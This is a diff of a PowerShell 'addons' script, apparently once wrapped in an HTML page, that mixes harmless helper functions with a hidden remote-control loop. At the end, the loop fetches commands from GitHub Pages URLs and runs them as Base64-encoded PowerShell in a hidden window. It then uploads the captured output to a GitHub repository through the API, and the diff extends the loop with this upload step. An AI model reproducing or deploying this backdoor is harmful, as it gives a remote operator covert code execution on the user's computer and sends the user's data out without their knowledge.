@@ -1,170 +1,201 @@
-<!DOCTYPE html>
-<html>
-  <head>
-      
-  </head>
-  <body>
-<p>
-  #YAGN's addons <br>
-$user = $env:USERNAME<br>
-$innerPath1 = "C:\Users\$user\Desktop"<br>
-$innerPath2 = "C:\Program Files"<br>
-function New-Popup {<br>
-    param ($Text = "", $Title = "", $button = "OK", $Icon = "None")<br>
-    Add-Type -AssemblyName PresentationFramework<br>
-    [System.Windows.MessageBox]::Show($Text, $Title, $Button, $Icon)<br>
-}<br>
-function Press-Key {<br>
-    param ($ASCIInumber)<br>
-    $vol = (New-Object -ComObject WScript.Shell)<br>
-    $vol.SendKeys([char]$ASCIInumber)<br>
-}<br>
-<br>
-<br>
-function Replace-String {<br>
-    param ($Str, $Repstr, $Repstrwith)<br>
-    return $Str.Replace($Repstr, $Repstrwith)<br>
-}<br>
-function Get-OwnershipOf {<br>
-    param($Path)<br>
-Get-Acl $Path | Select-Object -ExpandProperty Owner<br>
+#YAGN's addons <br>
+$user = $env:USERNAME <br>
+$innerPath1 = "C:\Users\$user\Desktop" <br>
+$innerPath2 = "C:\Program Files" <br>
+function New-Popup { <br>
+param ($Text = "", $Title = "", $button = "OK", $Icon = "None") <br>
+Add-Type -AssemblyName PresentationFramework <br>
+[System.Windows.MessageBox]::Show($Text, $Title, $Button, $Icon) <br>
 } <br>
-function Get-WebContent {<br>
-    param($website)<br>
-    $a = Invoke-WebRequest $website<br>
-    $content = $a.ParsedHtml.Body.innertext<br>
-    return $content<br>
-}<br>
-function Scan-Computerfor {<br>
-    param($Process)<br>
-    $x = Get-Process<br>
-    if ($x -match $Process) {<br>
-    return $true<br>
-       } else {<br>
-    return $false<br>
-   }<br>
-}<br>
-function square {<br>
-    param($num)<br>
-    return $num*$num<br>
-}<br>
-function squareRootOf {<br>
-    param($Num)<br>
-    $x = [Math]::Sqrt($num)<br>
-    return $x<br>
-}<br>
-function Start-Stopwatch {<br>
-    param($var)<br>
-    return [System.Diagnostics.Stopwatch]::StartNew()<br>
-}<br>
-function Stop-Stopwatch {<br>
-    param($var)<br>
-    $var.Stop()<br>
-}<br>
-function Get-Elapsed {<br>
-    param($var, $Format = "None")<br>
-    if ($Format -eq "Milliseconds") {<br>
-    return $var.ElapsedMilliseconds<br>
-    } elseif ($Format -eq "Ticks") {<br>
-    return $var.ElapsedTicks<br>
-    } elseif ($Format -eq "None") {<br>
-    return $var.Elapsed<br>
-    } else {<br>
-    Write-Host "<br>
-    Use:<br>
-    -Format 'Milliseconds'<br>
-    -Format 'Ticks'<br>
-    -Format 'None'<br>
-    "<br>
-    }<br>
-}<br>
-function Get-RunningProcessPath {<br>
-    param($Process)<br>
-    $x = Get-Process -Name $Process<br>
-    return $x.Path<br>
-}<br>
-function Change-BackgroundColor {<br>
-    param($Color)<br>
-    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {<br>
-    $host.UI.RawUI.BackgroundColor = $Color<br>
-    } else {<br>
-    Write-Error "Not a valid Color. choose from the following:<br>
-    Black <br>
-    DarkBlue <br>
-    DarkGreen <br>
-    DarkCyan <br>
-    DarkRed <br>
-    DarkMagenta <br>
-    DarkYellow <br>
-    Gray <br>
-    DarkGray <br>
-    Blue <br>
-    Green <br>
-    Cyan <br>
-    Red <br>
-    Magenta <br>
-    Yellow <br>
-    White"<br>
-    }<br>
-}<br>
-function Change-ForegroundColor {<br>
-    param($Color)<br>
-    if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") {<br>
-    $host.UI.RawUI.ForegroundColor = $Color<br>
-    } else {<br>
-    Write-Error "Not a valid Color. choose from the following:<br>
-    Black <br>
-    DarkBlue <br>
-    DarkGreen <br>
-    DarkCyan <br>
-    DarkRed <br>
-    DarkMagenta <br>
-    DarkYellow <br>
-    Gray <br>
-    DarkGray <br>
-    Blue <br>
-    Green <br>
-    Cyan <br>
-    Red <br>
-    Magenta <br>
-    Yellow <br>
-    White"<br>
-    }<br>
-}<br>
-function New-Shortcut {<br>
-    param($TargetPath, $ShortcutPath)<br>
-    $WshShell = New-Object -ComObject WScript.Shell<br>
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath) <br>
-    $Shortcut.TargetPath = $TargetPath <br>
-    $Shortcut.Save() <br>
-}<br>
-function Set-ShortcutIcon {<br>
-    param($ShortcutPath, $NewIconPath)<br>
-    $WshShell = New-Object -ComObject WScript.Shell<br>
-    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)<br>
-    $Shortcut.IconLocation = $NewIconPath<br>
-    $Shortcut.Save()<br>
-}<br>
-function Invoke-WebContent {<br>
-param($Uri)<br>
-$response = Invoke-WebRequest -Uri $Uri -UseBasicParsing<br>
-$doc = New-Object -ComObject 'HTMLFile'<br>
-$doc.IHTMLDocument2_write($response.Content)<br>
-return $doc.body.innerText<br>
-}<br>
+function Press-Key { <br>
+param ($ASCIInumber) <br>
+$vol = (New-Object -ComObject WScript.Shell) <br>
+$vol.SendKeys([char]$ASCIInumber) <br>
+} <br>
 <br>
 <br>
-$active = $true<br>
-while ($active) {<br>
-$contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-CodeContent/" #in progress<br>
-$signal = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/" #in progress<br>
-if ($signal -eq "True") {<br>
-Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
-$cmd = Get-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Raw<br>
-Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList $cmd -WindowStyle Hidden<br>
-  Start-Sleep -Seconds 300<br>
-}<br>
-}<br>
-</p>
-  </body>
-</html>
+function Replace-String { <br>
+param ($Str, $Repstr, $Repstrwith) <br>
+return $Str.Replace($Repstr, $Repstrwith) <br>
+} <br>
+function Get-OwnershipOf { <br>
+param($Path) <br>
+Get-Acl $Path | Select-Object -ExpandProperty Owner <br>
+} <br>
+function Get-WebContent { <br>
+param($website) <br>
+$a = Invoke-WebRequest $website <br>
+$content = $a.ParsedHtml.Body.innertext <br>
+return $content <br>
+} <br>
+function Scan-Computerfor { <br>
+param($Process) <br>
+$x = Get-Process <br>
+if ($x -match $Process) { <br>
+return $true <br>
+} else { <br>
+return $false <br>
+} <br>
+} <br>
+function square { <br>
+param($num) <br>
+return $num*$num <br>
+} <br>
+function squareRootOf { <br>
+param($Num) <br>
+$x = [Math]::Sqrt($num) <br>
+return $x <br>
+} <br>
+function Start-Stopwatch { <br>
+param($var) <br>
+return [System.Diagnostics.Stopwatch]::StartNew() <br>
+} <br>
+function Stop-Stopwatch { <br>
+param($var) <br>
+$var.Stop() <br>
+} <br>
+function Get-Elapsed { <br>
+param($var, $Format = "None") <br>
+if ($Format -eq "Milliseconds") { <br>
+return $var.ElapsedMilliseconds <br>
+} elseif ($Format -eq "Ticks") { <br>
+return $var.ElapsedTicks <br>
+} elseif ($Format -eq "None") { <br>
+return $var.Elapsed <br>
+} else { <br>
+Write-Host " <br>
+Use: <br>
+-Format 'Milliseconds' <br>
+-Format 'Ticks' <br>
+-Format 'None' <br>
+" <br>
+} <br>
+} <br>
+function Get-RunningProcessPath { <br>
+param($Process) <br>
+$x = Get-Process -Name $Process <br>
+return $x.Path <br>
+} <br>
+function Change-BackgroundColor { <br>
+param($Color) <br>
+if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") { <br>
+$host.UI.RawUI.BackgroundColor = $Color <br>
+} else { <br>
+Write-Error "Not a valid Color. choose from the following: <br>
+Black <br>
+DarkBlue <br>
+DarkGreen <br>
+DarkCyan <br>
+DarkRed <br>
+DarkMagenta <br>
+DarkYellow <br>
+Gray <br>
+DarkGray <br>
+Blue <br>
+Green <br>
+Cyan <br>
+Red <br>
+Magenta <br>
+Yellow <br>
+White" <br>
+} <br>
+} <br>
+function Change-ForegroundColor { <br>
+param($Color) <br>
+if ($Color -eq "Black" -or $Color -eq "DarkBlue" -or $Color -eq "DarkGreen" -or $Color -eq "DarkCyan" -or $Color -eq "DarkRed" -or $Color -eq "DarkMagenta" -or $Color -eq "DarkYellow" -or $Color -eq "Gray" -or $Color -eq "DarkGray" -or $Color -eq "Blue" -or $Color -eq "Green" -or $Color -eq "Cyan" -or $Color -eq "Red" -or $Color -eq "Magenta" -or $Color -eq "Yellow" -or $Color -eq "White") { <br>
+$host.UI.RawUI.ForegroundColor = $Color <br>
+} else { <br>
+Write-Error "Not a valid Color. choose from the following: <br>
+Black <br>
+DarkBlue <br>
+DarkGreen <br>
+DarkCyan <br>
+DarkRed <br>
+DarkMagenta <br>
+DarkYellow <br>
+Gray <br>
+DarkGray <br>
+Blue <br>
+Green <br>
+Cyan <br>
+Red <br>
+Magenta <br>
+Yellow <br>
+White" <br>
+} <br>
+} <br>
+function New-Shortcut { <br>
+param($TargetPath, $ShortcutPath) <br>
+$WshShell = New-Object -ComObject WScript.Shell <br>
+$Shortcut = $WshShell.CreateShortcut($ShortcutPath) <br>
+$Shortcut.TargetPath = $TargetPath <br>
+$Shortcut.Save() <br>
+} <br>
+function Set-ShortcutIcon { <br>
+param($ShortcutPath, $NewIconPath) <br>
+$WshShell = New-Object -ComObject WScript.Shell <br>
+$Shortcut = $WshShell.CreateShortcut($ShortcutPath) <br>
+$Shortcut.IconLocation = $NewIconPath <br>
+$Shortcut.Save() <br>
+} <br>
+function Invoke-WebContent { <br>
+param($Uri) <br>
+$response = Invoke-WebRequest -Uri $Uri -UseBasicParsing <br>
+$doc = New-Object -ComObject 'HTMLFile' <br>
+$doc.IHTMLDocument2_write($response.Content) <br>
+return $doc.body.innerText <br>
+} <br>
+<br>
+<br>
+$active = $true <br>
+while ($active) { <br>
+$contents = Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-CodeContent/" <in progress <br>
+$signal = (Invoke-WebContent -Uri "https://youraveragegreennoob.github.io/REmote-Signal/").Trim() <in progress <br>
+if ($signal -eq "True") { <br>
+$folder = "C:\Users\$env:USERNAME\Desktop\ImportantStuff" <br>
+if (-not (Test-Path -Path $folder)) { <br>
+New-Item -Path $folder -ItemType Directory -Force | Out-Null <br>
+} <br>
+Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents -Encoding utf8 <br>
+$cmd = Get-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Raw <br>
+$wrappedCmd = "& { $cmd } *>&1 | Out-String -Width 200 | Out-File -FilePath 'C:\Users\$env:USERNAME\Desktop\ImportantStuff\logs.txt' -Encoding utf8" <br>
+$encodedCmd = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($wrappedCmd)) <br>
+Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList @("-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", $encodedCmd) -WindowStyle Hidden -Wait <br>
+$localFile = "C:\Users\$env:USERNAME\Desktop\ImportantStuff\logs.txt" <br>
+$bytes = [System.IO.File]::ReadAllBytes($localFile) <br>
+$base64Content = [System.Convert]::ToBase64String($bytes) <br>
+<br>
+$owner = "YourAverageGreenNoob" <br>
+$repo = "REmote-Feedback" <br>
+$remotePath = "logs.txt" <br>
+$token = "YOUR_NEW_TOKEN_HERE" <br>
+<br>
+$headers = @{ <br>
+Authorization = "Bearer $token" <br>
+Accept = "application/vnd.github+json" <br>
+"X-GitHub-Api-Version" = "2022-11-28" <br>
+} <br>
+<br>
+$uri = "https://api.github.com/repos/$owner/$repo/contents/$remotePath" <br>
+$body = @{ <br>
+message = "Update command output" <br>
+content = $base64Content <br>
+} <br>
+<br>
+< Step 4 <br>
+try { <br>
+$existing = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -ErrorAction Stop <br>
+if ($existing.sha) { <br>
+$body.sha = $existing.sha <br>
+} <br>
+} catch { <br>
+if ($_.Exception.Response -and $_.Exception.Response.StatusCode.value__ -ne 404) { <br>
+throw <br>
+} <br>
+} <br>
+<br>
+< Step 5 <br>
+$response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Put -Body ($body | ConvertTo-Json) -ContentType "application/json" -ErrorAction Stop <br>
+Start-Sleep -Seconds 300 <br>
+} <br>
+} <br>
